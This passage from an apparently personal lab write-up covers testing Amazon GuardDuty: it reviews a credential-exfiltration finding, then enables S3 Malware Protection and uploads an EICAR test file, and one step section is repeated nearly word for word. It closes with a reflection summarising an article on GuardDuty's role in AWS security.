    <li><strong>Type:</strong> <code>UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS</code></li>
    <li><strong>Severity:</strong> High</li>
    <li><strong>Target Resource:</strong> <code>vulnerablewebapp-thesecurebucket-qu2vniy4nr6f</code></li>
    <li><strong>Service Accessed:</strong> Amazon S3 (<code>ListObjects</code>)</li>
    <li><strong>Source IP:</strong> <code>18.234.36.100</code> (Ashburn, US)</li>
    <li><strong>Remote AWS Account:</strong> <code>792359258118</code></li>
    <li><strong>Detection Time:</strong> ~5 minutes after first access</li>
  </ul>

  <p>✅ This confirms GuardDuty is working correctly—detecting threats like stolen credentials being used inappropriately across AWS accounts.</p>
</div>


<!-- Step #4: Malware Detection  -->

<div style="width: 100%; text-align: center; border-bottom: 1px solid #ccc; line-height: 0.1em; margin: 40px 0 20px;">
  <span style="background:#fff; padding:0 10px;">🚨 Step #5</span>
</div>

#

<div style="border: 1px solid #ddd; padding: 20px; border-radius: 8px; background: #f9f9f9; margin-top: 20px;">

  <h3>Test GuardDuty Malware Protection</h3>

  <p>In this step, you'll explore how <strong>Amazon GuardDuty</strong> detects malware in S3 buckets.</p>

  <ul>
    <li>✅ Enable <strong>Malware Protection</strong> for your S3 bucket in the GuardDuty console.</li>
    <li>📄 Upload a safe <strong>EICAR test file</strong> — a harmless file commonly used to simulate malware.</li>
    <li>🛡️ Wait for GuardDuty to scan and flag the file as suspicious.</li>
    <li>🔍 Review the finding to see how GuardDuty identifies and classifies malware threats.</li>
  </ul>

  <p>This hands-on test shows how GuardDuty adds another layer of protection by automatically monitoring for malicious files stored in your cloud environment.</p>

 <img src="Threat Detection with GuardDuty/Malware protection.png" alt="GuardDuty finding example" width="400">


  <h4>🔧 Enable Malware Protection</h4>
  <p>Enable Malware Protection for S3 in GuardDuty for your web app's S3 bucket.</p>

  <p><strong>💡 What is malware?</strong><br>
  Malware is a type of software designed to harm computers. It can steal data or disrupt operations. GuardDuty helps protect AWS resources by detecting and alerting on malware in your environment.</p>

  <p><strong>💸 Free Tier Note:</strong><br>
  - Before <strong>June 11, 2025</strong>: Free for all accounts until June 15, 2025.<br>
  - After <strong>June 11, 2025</strong>: Free only for accounts less than 12 months old. Otherwise, charges may apply.</p>

  <img src="Threat Detection with GuardDuty/Enabled malware protection-1.png" alt="Enabled Malware Protection Screenshot" style="max-width: 100%; border-radius: 4px; margin: 16px 0;" />

  <h4>📥 Upload Malware File</h4>
  <p>To verify that Malware Protection is working, upload the following test file to your S3 bucket:</p>

  <p><strong>➡️ File:</strong> <code>EICAR-test-file.txt</code></p>

  <p><strong>💡 What's an EICAR file?</strong><br>
  It's a harmless test file used to simulate malware and test antivirus responses — without using an actual virus. GuardDuty should detect and report it as malicious once uploaded.</p>

  <p><em>Tip: EICAR stands for the European Institute for Computer Antivirus Research.</em></p>

  <img src="Threat Detection with GuardDuty/Malware Event.png" alt="Malware Detection Event" style="max-width: 70%; border-radius: 4px; margin-top: 16px;" />
</div>



<div style="width: 70%; text-align: center; border-bottom: 1px solid #ccc; line-height: 0.1em; margin: 40px 0 20px;">
  <span style="background:#fff; padding:0 10px;">🚨 Step #5</span>
</div>

##

<div style="border: 1px solid #ddd; padding: 20px; border-radius: 8px; background: #f9f9f9; margin-top: 20px;">

  <h3>Test GuardDuty Malware Protection</h3>

  <p>In this step, you'll explore how <strong>Amazon GuardDuty</strong> detects malware in S3 buckets.</p>

  <ul>
    <li>✅ Enable <strong>Malware Protection</strong> for your S3 bucket in the GuardDuty console.</li>
    <li>📄 Upload a safe <strong>EICAR test file</strong> — a harmless file commonly used to simulate malware.</li>
    <li>🛡️ Wait for GuardDuty to scan and flag the file as suspicious.</li>
    <li>🔍 Review the finding to see how GuardDuty identifies and classifies malware threats.</li>
  </ul>

  <p>This hands-on test shows how GuardDuty adds another layer of protection by automatically monitoring for malicious files stored in your cloud environment.</p>

  <div style="border: 5px solid #f4a261; padding: 5px; display: inline-block; margin: 16px 0;">
    <img src="Threat Detection with GuardDuty/Malware protection.png" alt="Malware Protection Overview" style="max-width: 100%; border-radius: 4px;" />
  </div>

  <h4>🔧 Enable Malware Protection</h4>
  <p>Enable Malware Protection for S3 in GuardDuty for your web app's S3 bucket.</p>

  <p><strong>💡 What is malware?</strong><br>
  Malware is a type of software designed to harm computers. It can steal data or disrupt operations. GuardDuty helps protect AWS resources by detecting and alerting on malware in your environment.</p>

  <p><strong>💸 Free Tier Note:</strong><br>
  - Before <strong>June 11, 2025</strong>: Free for all accounts until June 15, 2025.<br>
  - After <strong>June 11, 2025</strong>: Free only for accounts less than 12 months old. Otherwise, charges may apply.</p>

<img src="Threat Detection with GuardDuty/Enabled malware protection-1.png" alt="GuardDuty finding example" width="1300">


  <h4>📥 Upload Malware File</h4>
  <p>To verify that Malware Protection is working, upload the following test file to your S3 bucket:</p>

  <p><strong>➡️ File:</strong> <code>EICAR-test-file.txt</code></p>

  <p><strong>💡 What's an EICAR file?</strong><br>
  It's a harmless test file used to simulate malware and test antivirus responses — without using an actual virus. GuardDuty should detect and report it as malicious once uploaded.</p>

  <p><em>Tip: EICAR stands for the European Institute for Computer Antivirus Research.</em></p>

  <div style="border: 5px solid #f4a261; padding: 5px; display: inline-block; margin-top: 16px;">
    <img src="Threat Detection with GuardDuty/Malware Event.png" alt="Malware Detection Event" style="max-width: 100%; border-radius: 4px;" />
  </div>


### Project reflection

I completed this project in approximately 2–3 hours, including setup, testing, and analyzing GuardDuty findings.

The conclusion of the post "Detecting and Responding to Threats in AWS with GuardDuty" emphasizes that Amazon GuardDuty is a powerful, fully managed threat detection service that significantly enhances the security posture of AWS environments. The article highlights that GuardDuty provides continuous, intelligent monitoring for suspicious activity and potential threats by leveraging advanced machine learning, anomaly detection, and integrated threat intelligence. This enables organizations to detect threats such as unauthorized access, credential misuse, and data exfiltration quickly and efficiently.

The post also stresses the importance of integrating GuardDuty findings into automated response workflows, such as using AWS Lambda and Security Hub, to accelerate incident response and reduce manual intervention. By doing so, security teams can respond to threats in real time, minimizing potential damage and maintaining compliance.

In summary, the article concludes that enabling and properly configuring GuardDuty is a critical step for any organization using AWS. It not only provides robust threat detection but also streamlines incident response, making it an essential component of a comprehensive AWS security strategy. The post encourages readers to leverage GuardDuty’s capabilities to proactively protect their cloud resources and data.
